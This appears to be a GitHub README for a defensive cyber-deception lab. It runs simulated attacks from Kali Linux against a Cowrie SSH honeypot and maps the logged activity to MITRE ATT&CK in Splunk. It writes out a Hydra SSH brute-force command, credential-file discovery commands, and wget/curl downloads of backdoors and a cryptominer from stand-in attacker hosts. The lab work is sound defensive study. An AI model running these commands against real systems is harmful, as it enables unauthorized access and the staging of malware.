# Cyber-Deception-Threat-Intelligence-Lab
Cowrie Honeypot Attack Stimulation

<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/9b558bab-9287-42aa-a65f-c3b243a0efbe" />


---

# Use Case 1: Hydra Brute Force Attack Detection

## Objective

Validate the Cowrie SSH honeypot's ability to detect, capture, and log automated password guessing attacks originating from an attacker-controlled system.

---

## Objective

Brute force attacks remain one of the most common techniques used by adversaries to gain unauthorized access to internet-facing services. Rather than manually attempting credentials, attackers frequently leverage automated tools such as Hydra to rapidly test large numbers of usernames and passwords against SSH services.To simulate this behavior, a custom password wordlist was created on the Kali Linux attacker machine and used to launch an automated credential attack against the Cowrie SSH honeypot.

---

## Creating the Password Wordlist

A custom password list was created using Nano on the Kali Linux attack workstation.

### Password List

```text
admin
password123
welcome
qwerty
loveyou
```

### Screenshot

<img width="1021" height="470" alt="image" src="https://github.com/user-attachments/assets/96d7f897-631f-4928-bb6c-7274c2850cd7" />

---

## Attack Simulation

The following Hydra command was executed from Kali Linux:

```bash
hydra -l root -P password.txt 10.0.2.5 -s 2222 ssh
```

### Command Breakdown

| Parameter | Purpose |
|------------|-----------|
| `-l root` | Target username |
| `-P password.txt` | Password wordlist |
| `10.0.2.5` | Cowrie Honeypot IP |
| `-s 2222` | Cowrie SSH Port |
| `ssh` | Target service |

<img width="1229" height="506" alt="image" src="https://github.com/user-attachments/assets/c698c7d6-350a-4f1a-9c33-94d29c62c61b" />

---

## Expected Attack Behavior

Hydra systematically attempts each password in the provided wordlist against the target SSH service.

Credential combinations tested:

```text
root/admin
root/password123
root/welcome
root/qwerty
root/loveyou
```

---

## Evidence Collection

During execution, Cowrie logs were monitored using:

```bash
tail -f ~/cowrie/var/log/cowrie/cowrie.log
```

<img width="1047" height="259" alt="image" src="https://github.com/user-attachments/assets/76c9b8c6-ca13-44ba-98ea-00aca938927d" />

**Hydra successfully identified multiple accepted credentials, with Cowrie recording successful authentication events and generating attacker telemetry.**

The honeypot recorded:

- Failed login attempts
- Username targeting activity
- Password guessing behavior
- Source IP address information
- Authentication outcomes

 
**Confirmation in Honeypot of the login attempts with the passwords**
  ```bash
  grep "login attempt" ~/cowrie/var/log/cowrie/cowrie.log
  ```

 <img width="545" height="116" alt="image" src="https://github.com/user-attachments/assets/50e49b48-e0e6-4995-9677-1490f7d4bdea" />

---


**What telemetry was generated?**

```text
Authentication Events
Username Attempts
Password Attempts
Source IP Information
Session Data
```
---

## MITRE ATT&CK Mapping

### Credential Access
T1110.001 - Password Guessing

---

**This intelligence can be leveraged to improve detections, enrich threat hunting investigations, and enhance defensive monitoring.**

## Outcome

✅ Simulated a password guessing attack against an SSH service using Hydra

✅ Generated multiple authentication attempts against the Cowrie honeypot

✅ Captured both successful and failed login events

✅ Recorded attacker username and password combinations

✅ Collected source IP address information for attribution and analysis

✅ Observed credential access behavior consistent with password guessing attacks

✅ Generated session telemetry for threat hunting and investigation

✅ Validated Cowrie's ability to detect and log brute force activity

---

# Use Case 2: Post-Compromise Discovery

## Objective

Capture attacker reconnaissance activity after gaining shell access.

**Successfully created the ssh session**
```bash
ssh root@10.0.2.5 -p 2222
```
<img width="405" height="93" alt="image" src="https://github.com/user-attachments/assets/f3c9442c-5bf8-45db-a273-baae6f6d318f" />

Arbitary password was sent to the cowrie logs

<img width="559" height="159" alt="image" src="https://github.com/user-attachments/assets/86743a8b-943f-4075-aec2-a7d2aa12b26b" />


## Attack Simulation

```bash
whoami
pwd
uname -a
id
ls
cat /etc/passwd
```

**Kali Linxus (attacker) input**

<img width="453" height="341" alt="Kali Linux Command Screenshot" src="https://github.com/user-attachments/assets/cb7160a7-9f8b-48d8-95ec-17d3eb0138df" />


**Cowrie Honeypot Data**

<img width="569" height="137" alt="Cowrie Command Screenshot" src="https://github.com/user-attachments/assets/6997221c-8032-45f5-bff0-a02cd9da1ae4" />


## MITRE ATT&CK

- T1082 – System Information Discovery
- T1083 – File and Directory Discovery

## Evidence Collected

- Commands executed
- Session activity
- Discovery behavior

## Outcome

✅ Discovery activity captured

✅ Attacker behavior recorded

---

# Use Case 3: File Download & Tool Transfer

## Objective

Demonstrate how defenders can detect, investigate, and analyze adversary attempts to transfer tools, scripts, or malware to a compromised system following initial access.

After obtaining access to a target environment, attackers frequently attempt to download additional resources such as reconnaissance tools, persistence mechanisms, credential theft utilities, remote access trojans (RATs), cryptominers, or custom malware payloads. These actions are often indicative of an attacker transitioning from initial access to post-exploitation activities.

In this use case, a simulated attacker leveraged common Linux utilities (`wget` and `curl`) to download external files from attacker-controlled infrastructure. The Cowrie SSH honeypot captured each command execution event, while Splunk provided centralized visibility into the attempted tool transfers.

## Attack Simulation

```bash

wget https://malicious.example/payload.sh

curl https://malicious.example/backdoor.sh

wget https://evil.example/cryptominer.tar.gz
```

<img width="901" height="472" alt="image" src="https://github.com/user-attachments/assets/e76e3d12-318a-4b64-8f78-638f8a48849f" />


## Evidence Collected

- Download attempts
- File transfer activity
- Command execution telemetry


## MITRE ATT&CK MAPPING

- T1105 – Ingress Tool Transfer

  ## Outcome

✅ Simulated post-compromise tool transfer activity using common Linux utilities (`wget` and `curl`)

✅ Generated telemetry associated with attacker file download attempts

✅ Captured command execution activity within the Cowrie SSH honeypot

✅ Collected indicators of compromise (IOCs) including domains, URLs, and file names

✅ Recorded attacker behavior consistent with post-exploitation and malware staging activity




---

# Use Case 4: Threat Intelligence Collection

## Objective

Demonstrate how a honeypot can be leveraged to collect, analyze, and transform attacker activity into actionable threat intelligence.

In this scenario, an attacker successfully authenticated to the Cowrie SSH honeypot and executed reconnaissance and file download commands. The resulting telemetry was forwarded to Splunk, where it was analyzed to identify attacker behavior, command execution activity, and potential indicators of compromise (IOCs).

The goal of this use case is to emulate post-compromise activity and demonstrate how defenders can leverage honeypot telemetry to gain visibility into adversary tactics, techniques, and procedures (TTPs) without exposing production assets to risk.

**Kali Linux Attack**

```bash
whoami
wget https://evil.example/bah.sh
curl https://malicious.example/backdoor.tar.gz
```

<img width="505" height="199" alt="image" src="https://github.com/user-attachments/assets/dd435065-2ab9-47f0-a14e-584abe7d29fe" />

**Splunk Query for Cowrie Activity**


<img width="824" height="623" alt="image" src="https://github.com/user-attachments/assets/f48d85f0-d503-4536-9b6f-c99239b830c9" />

## MITRE ATT&CK

- T1078 – Valid Accounts
- T1033 – System Owner/User Discovery
- T1105 – Ingress Tool Transfer
- T1059 – Command and Scripting Interpreter
  
## Intelligence Collected

- Usernames
- Password Attempts
- Successful Logins
- Commands Executed
- Session Activity
- File Download Attempts

## Outcome

✅ Threat intelligence generated

✅ Adversary behavior documented



---

# Final Results

- Captured attacker activity using a Cowrie SSH Honeypot
- Simulated adversary behavior using Kali Linux
- Detected reconnaissance activity using Nmap
- Detected credential attacks using Hydra
- Captured successful authentication events
- Recorded post-compromise discovery activity
- Logged tool transfer attempts
- Generated actionable threat intelligence
- Visualized attack telemetry in Splunk
- Correlated activity to MITRE ATT&CK techniques

## Key Takeaway

> A honeypot is not designed to stop attacks—it is designed to make them visible.

By intentionally accepting attacker interactions and recording every action, Cowrie provides defenders with valuable telemetry that can be leveraged for threat hunting, threat intelligence, detection engineering, and adversary emulation exercises.
